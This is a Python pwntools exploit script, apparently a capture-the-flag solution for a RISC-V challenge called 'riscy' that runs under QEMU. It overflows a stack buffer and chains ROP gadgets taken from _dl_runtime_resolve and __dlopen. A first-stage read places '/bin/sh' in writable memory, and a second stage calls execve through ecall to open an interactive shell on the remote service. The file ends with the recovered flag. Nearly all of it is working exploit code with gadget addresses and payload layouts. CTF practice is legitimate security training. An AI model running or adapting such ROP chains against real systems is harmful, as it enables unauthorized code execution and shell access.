#!/usr/bin/env python3

from pwn import *

exe = ELF("./target")


def conn():
    if args.LOCAL:
        r = process(["./qemu-riscv64", "./target"])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("riscy.sstf.site", 18223 )

    return r


def main():
    r = conn()
    
    # Used gadgets
    ''' set_all_gad
    
        0x41782 <_dl_runtime_resolve+54>:	mv	t1,a0
        0x41784 <_dl_runtime_resolve+56>:	ld	ra,72(sp)
        0x41786 <_dl_runtime_resolve+58>:	ld	a0,8(sp)
        0x41788 <_dl_runtime_resolve+60>:	ld	a1,16(sp)
        0x4178a <_dl_runtime_resolve+62>:	ld	a2,24(sp)
        0x4178c <_dl_runtime_resolve+64>:	ld	a3,32(sp)
        0x4178e <_dl_runtime_resolve+66>:	ld	a4,40(sp)
        0x41790 <_dl_runtime_resolve+68>:	ld	a5,48(sp)
        0x41792 <_dl_runtime_resolve+70>:	ld	a6,56(sp)
        0x41794 <_dl_runtime_resolve+72>:	ld	a7,64(sp)
        0x41796 <_dl_runtime_resolve+74>:	fld	fa0,80(sp)
        0x41798 <_dl_runtime_resolve+76>:	fld	fa1,88(sp)
        0x4179a <_dl_runtime_resolve+78>:	fld	fa2,96(sp)
        0x4179c <_dl_runtime_resolve+80>:	fld	fa3,104(sp)
        0x4179e <_dl_runtime_resolve+82>:	fld	fa4,112(sp)
        0x417a0 <_dl_runtime_resolve+84>:	fld	fa5,120(sp)
        0x417a2 <_dl_runtime_resolve+86>:	fld	fa6,128(sp)
        0x417a4 <_dl_runtime_resolve+88>:	fld	fa7,136(sp)
        0x417a6 <_dl_runtime_resolve+90>:	addi	sp,sp,144
        0x417a8 <_dl_runtime_resolve+92>:	jr	t1

    '''
    
    '''gad_set_a0
        0x4602e <__dlopen+42>:	ld	ra,40(sp)
        0x46030 <__dlopen+44>:	ld	a0,16(sp)
        0x46032 <__dlopen+46>:	addi	sp,sp,48
        0x46034 <__dlopen+48>:	ret
    '''
    
    # Constants
    gad_set_all     = 0x41782
    gad_set_a0      = 0x4602e
    
    read            = 0x00000000000260da
    ecall           = 0x1414a
    writeable       = 0x0006c000
    start           = 0x0000000000010434
    
    # Stage 1
    payload = b"a"*40           # padding
    payload += p64(gad_set_a0)  # ra register - ret value

    # gad set a0
    # 16 bytes padding - a0 value - 16 bytes padding - ra value to ret
    payload += p64(0x69696969)*2 + p64(read) + p64(0x69696969)*2 + p64(gad_set_all)

    # gad set all
    payload += p64(0x69696969)  # padding
    payload += p64(0)           # a0
    payload += p64(writeable)   # a1
    payload += p64(0x500)       # a2
    payload += p64(0)*5         # padding (a3,a4,a5,a6,a7)
    payload += p64(start)       # ra register - ret to start for stage 2
    payload += p64(0)*8         # padding
    
    r.sendline(payload)
    
    pause()
    
    r.sendline('/bin/sh\0')
    
    pause()
    
    # stage 2
    payload = b"a"*40           # padding
    payload += p64(gad_set_a0)  # ra register - ret value

    # gad set a0
    # 16 bytes padding - a0 value - 16 bytes padding - ra value to ret
    payload += p64(0x69696969)*2 + p64(ecall) + p64(0x69696969)*2 + p64(gad_set_all)

    # gad set all
    # setup for execve("/bin/sh", NULL, NULL)
    payload += p64(0x69696969)      # padding
    payload += p64(writeable)       # a0 : "/bin/sh"
    payload += p64(0)               # a1 : NULL
    payload += p64(0)               # a2 : NULL
    payload += p64(0)*4             # padding
    payload += p64(221)             # a7 - syscall number
    payload += p64(0)               # ret, not used now
    payload += p64(0)*8             # padding
    
    r.sendline(payload)
    
    r.interactive() # SCTF{Ropping RISCV is no difference!}


if __name__ == "__main__":
    main()
